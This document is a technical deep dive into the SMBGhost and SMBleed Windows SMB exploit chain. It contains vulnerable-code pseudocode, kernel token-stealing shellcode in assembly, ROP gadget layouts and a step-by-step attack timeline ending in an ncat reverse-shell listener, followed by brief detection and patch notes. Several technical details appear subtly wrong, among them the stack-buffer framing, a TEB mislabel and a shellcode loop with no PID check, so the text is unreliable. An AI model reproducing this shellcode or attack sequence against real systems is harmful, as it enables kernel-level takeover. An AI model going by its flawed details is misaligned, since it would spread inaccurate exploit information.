# CVE-2020-0796 Technical Deep Dive

## Vulnerability Root Cause

### The Bug
```c
// Vulnerable code in srvnet.sys (Microsoft SMB Server Network Transport)
void ProcessCompressionPacket(SMB_COMPRESS_HEADER *header, BYTE *data) {
    BYTE decompressedBuffer[65536];  // Fixed-size buffer
    
    // BUG: No validation that decompressed_size <= buffer_size
    int decompressed_size = header->uncompressed_size;  // Can be 0xFFFFFFFF
    int compressed_size = header->compressed_size;
    
    // Decompress writes DECOMPRESSED_SIZE bytes, but buffer is only 65536 bytes
    int bytes_written = RtlDecompressBufferEx(
        algorithm,
        decompressedBuffer,      // Buffer of 65536 bytes
        decompressed_size,       // Unvalidated size from network
        data,
        compressed_size,
        &final_size
    );
    
    // OVERFLOW: If decompressed_size > 65536, memory is corrupted
    // This overwrites kernel stack and adjacent data structures
}
```

### Attack Vector: SMB Compression
```
Normal Packet:
┌─────────────────────────────────────────┐
│ SMB2 COMPRESS Header                    │
├─────────────────────────────────────────┤
│ uncompressed_size = 1000                │
│ compressed_size = 500                   │
├─────────────────────────────────────────┤
│ [Compressed Data - 500 bytes]           │
└─────────────────────────────────────────┘

Malicious Packet:
┌─────────────────────────────────────────┐
│ SMB2 COMPRESS Header (CRAFTED)          │
├─────────────────────────────────────────┤
│ uncompressed_size = 131072  ← TOO LARGE │
│ compressed_size = 65536                 │
├─────────────────────────────────────────┤
│ [Malicious Compressed Data]             │
│ [Shellcode embedded in payload]         │
│ [ROP gadgets]                           │
└─────────────────────────────────────────┘

Decompression Process:
Buffer allocated: 65536 bytes
Decompresses to: 131072 bytes
Result: 65536 bytes OVERFLOW → Kernel Memory Corruption
```

---

## Memory Corruption Details

### Stack Layout Before Overflow
```
Higher Addresses
├─────────────────────────────────┐
│ Return Address                  │  ← Saved RIP (what we want to hijack)
├─────────────────────────────────┤
│ Saved RBP                       │
├─────────────────────────────────┤
│ Local Variables                 │
├─────────────────────────────────┤
│ Buffer[65536]    ← Write target │
├─────────────────────────────────┤
│ Function Prologue               │
└─────────────────────────────────┘
Lower Addresses
```

### Stack After Overflow
```
Higher Addresses
├─────────────────────────────────┐
│ 0x4141414141414141  ← SHELLCODE ADDRESS
│ (Overwritten Return Address)    │
├─────────────────────────────────┤
│ 0x4242424242424242              │
├─────────────────────────────────┤
│ Decompressed Data (131K bytes)  │
│ ▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼            │
│ [MASSIVE OVERFLOW - 65KB excess]│
│ ▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼            │
│ Buffer[65536]                   │
└─────────────────────────────────┘
Lower Addresses
```

---

## Two-Vulnerability Exploitation Chain

### CVE-2020-1206 (SMBleed) - Information Disclosure
```
Purpose: Leak kernel memory to defeat ASLR
Process:
  1. Send crafted SMB packet with out-of-bounds offset
  2. Server reads memory beyond allocated buffer
  3. Data leaks back in response
  4. Attacker learns kernel base address

Code:
  → Read srvnet.sys base
  → Read kernel.exe (ntoskrnl.exe) base
  → Calculate gadget addresses
  → Build ROP chain
```

### CVE-2020-0796 (SMBGhost) - Code Execution
```
Purpose: Execute arbitrary code in kernel mode
Process:
  1. Use leaked addresses from SMBleed
  2. Craft SMB compress packet with overflow
  3. Overflow kernel stack with ROP chain
  4. ROP chain executes shellcode
  5. Shellcode runs cmd.exe with SYSTEM privileges
  6. Reverse shell connects back to attacker
```

### Combined Attack
```
SMBleed (CVE-2020-1206)
    │
    ├─→ Leak kernel base address
    ├─→ Leak srvnet.sys base address
    ├─→ Calculate ROP gadget offsets
    │
    ▼
SMBGhost (CVE-2020-0796)
    │
    ├─→ Buffer overflow with crafted payload
    ├─→ Overwrite stack with ROP chain
    ├─→ Execute ROP chain (still needs SMBleed info)
    │
    ▼
System Compromise
    │
    └─→ SYSTEM shell, full OS control
```

---

## Shellcode Analysis

### x64 Kernel Shellcode Structure
```asm
; smbghost_kshellcode_x64.asm
; Executes in kernel mode (ring 0)

; 1. Preserve registers
push rbx
push rsi
push rdi

; 2. Find current EPROCESS (process block)
mov rax, [gs:0x188]      ; Get current thread from TEB
mov rbx, [rax+0x220]     ; Get EPROCESS from thread

; 3. Change token to SYSTEM token
mov rsi, rbx
mov rcx, 0
.find_system_token:
    mov rax, [rsi]               ; Next EPROCESS
    cmp rax, rbx
    je .token_found
    mov rsi, rax
    inc rcx
    cmp rcx, 0x100
    jl .find_system_token
    
.token_found:
    ; Copy SYSTEM process token to current process
    mov rax, [rsi+0x4b8]         ; SYSTEM token
    mov [rbx+0x4b8], rax         ; Inject into current process token

; 4. Disable protections (optional)
mov rax, [rbx+0x450]             ; Protections
and rax, 0xFFFFFFFFFFFFF7FF       ; Disable DEP
mov [rbx+0x450], rax

; 5. Return to usermode
pop rdi
pop rsi
pop rbx
ret
```

### Shellcode Execution Flow
```
ROP Chain Setup:
  1. ROP gadget: mov rsp, <shellcode_addr>
  2. Stack pointer now points to shellcode
  3. ret instruction executes shellcode
  
Shellcode Execution (Ring 0):
  4. Elevate current process to SYSTEM token
  5. Create command shell (cmd.exe)
  6. Shell executes with SYSTEM privileges
  
User Mode Execution:
  7. Spawned process connects to attacker
  8. Reverse shell established
  9. Full system compromise
```

---

## Kernel Memory Gadgets (ROP Chain)

### Purpose of ROP Chain
- Execute shellcode without direct control
- Avoid direct buffer execution
- Chain multiple gadget instructions
- Return to shellcode safely

### Example ROP Gadgets (x64)
```asm
; Gadget 1: Load RAX with address
pop rax
ret
Address: 0xFFFFF800XXX00100

; Gadget 2: Jump to RAX (execute shellcode)
jmp rax
Address: 0xFFFFF800XXX00200

; Gadget 3: Restore stack
add rsp, 0x28
ret
Address: 0xFFFFF800XXX00300
```

### ROP Chain Execution
```
Stack Before ROP:
┌──────────────────────┐
│ 0xFFFFF800XXX00100   │ ← pop rax; ret (loads shellcode addr)
├──────────────────────┤
│ <SHELLCODE_ADDRESS>  │ ← RAX gets this value
├──────────────────────┤
│ 0xFFFFF800XXX00200   │ ← jmp rax (jumps to shellcode)
├──────────────────────┤
│ [Shellcode here]     │ ← Executes in kernel
└──────────────────────┘

Execution:
  1. pop rax; ret  → RAX = SHELLCODE_ADDRESS
  2. jmp rax       → Jump to shellcode
  3. [kernel shellcode runs]
  4. Token elevation happens
  5. User shell spawned
```

---

## Address Space Layout (ASLR Bypass)

### Standard ASLR (Randomized)
```
Kernel Space (High)
├─────────────────────────────────┐
│ ntoskrnl.exe (kernel)           │ Random base: 0xFFFFF800XXXXXXXX
│  - Randomized by ASLR            │
└─────────────────────────────────┤
│ srvnet.sys (SMB server)         │ Random base: 0xFFFFF800XXXXXXXX
│  - Offsets from SMB server base │
└─────────────────────────────────┤
│ Stack / Heap (randomized)       │
└─────────────────────────────────┘

User Space
├─────────────────────────────────┐
│ cmd.exe                         │ Variable address
│ ... user processes ...          │
└─────────────────────────────────┘
```

### How SMBleed Defeats ASLR
```
1. Send SMB packet with out-of-bounds read
2. Server leaks: "0xFFFFF800XXXXXXXX" (kernel base)
3. Attacker calculates all gadget addresses
4. ASLR defeated! All addresses now predictable

Before SMBleed:
  kernel_base = UNKNOWN
  gadget_address = UNKNOWN
  shellcode_address = UNKNOWN

After SMBleed:
  kernel_base = 0xFFFFF80002C00000 (LEAKED)
  gadget_address = kernel_base + 0x12C410 (CALCULATED)
  shellcode_address = kernel_base + 0x1E5000 (CALCULATED)
```

---

## Exploitation Timeline with Packet Details

```
T=0s   Attacker starts listener
       ncat -lvp 4444

T=2s   Attacker sends SMB NEGOTIATE
       ├─ Protocol: SMB v3.1.1
       ├─ Compression: ENABLED (this is the vulnerability vector)
       └─ Capabilities: Standard

T=3s   Target responds to NEGOTIATE
       ├─ Confirms SMB v3.1.1 support
       ├─ Confirms compression support
       └─ Session established

T=5s   Attacker sends SMBleed packet
       ├─ Special compression request
       ├─ Causes out-of-bounds read
       └─ Memory data leaked in response

T=8s   Attacker processes leaked data
       ├─ Extract kernel base address
       ├─ Calculate ROP gadget addresses
       └─ Build payload

T=12s  Attacker crafts malicious COMPRESS
       ├─ uncompressed_size = 0x20000 (131KB)
       ├─ compressed_size = 0x10000 (64KB)
       ├─ Buffer[65KB] will overflow 65KB
       └─ Payload contains ROP + shellcode

T=15s  Malicious packet sent to target
       ├─ Target receives compression request
       ├─ Allocates 65KB buffer
       ├─ Attempts to decompress 131KB into 65KB
       └─ BUFFER OVERFLOW occurs

T=16s  Kernel memory corrupted
       ├─ Stack return address overwritten
       ├─ ROP chain is now on corrupted stack
       └─ Next RET instruction triggers ROP

T=17s  ROP chain executes
       ├─ pop rax; ret  → RAX = shellcode address
       ├─ jmp rax       → Jump to shellcode
       └─ Shellcode executes in kernel mode

T=18s  Kernel shellcode runs
       ├─ Elevate current process token to SYSTEM
       ├─ Create cmd.exe child process
       ├─ Cmd.exe inherits SYSTEM token
       └─ Process spawned with SYSTEM privileges

T=19s  Reverse shell connection
       ├─ cmd.exe connects to attacker's ncat listener
       ├─ Connection established (TCP 445 → 4444)
       └─ Interactive shell prompt appears

T=20s+ Attacker has SYSTEM shell
       ├─ Executes: whoami → "nt authority\system"
       ├─ Full kernel privilege level
       └─ Complete system compromise
```

---

## Mitigation & Defense

### Patch (KB4551762)
- Microsoft released fix in March 2020
- Validates `uncompressed_size` against buffer size
- Prevents buffer overflow

### Network Detection
```
IDS Signature Patterns:
  1. SMB COMPRESS with uncompressed_size >> compressed_size
  2. Multiple SMBleed requests followed by COMPRESS
  3. Unusual kernel memory access patterns
```

### Host-Based Detection
```
Indicators:
  - kernel32.dll / ntoskrnl.exe crashes
  - SMB server process restart
  - Suspicious cmd.exe spawned from system process
  - SYSTEM token elevation in unusual process
```

---

## Summary

**Vulnerability Chain**:
```
SMBleed (Info Leak)
     ↓
Leak kernel addresses
     ↓
Defeat ASLR
     ↓
Build ROP chain
     ↓
SMBGhost (Buffer Overflow)
     ↓
Overflow kernel stack
     ↓
Hijack execution flow
     ↓
Execute ROP chain
     ↓
Execute kernel shellcode
     ↓
Token elevation
     ↓
System shell (SYSTEM privileges)
     ↓
COMPLETE SYSTEM COMPROMISE
```

This two-stage vulnerability chain is one of the most sophisticated pre-auth RCE exploits discovered in recent years.
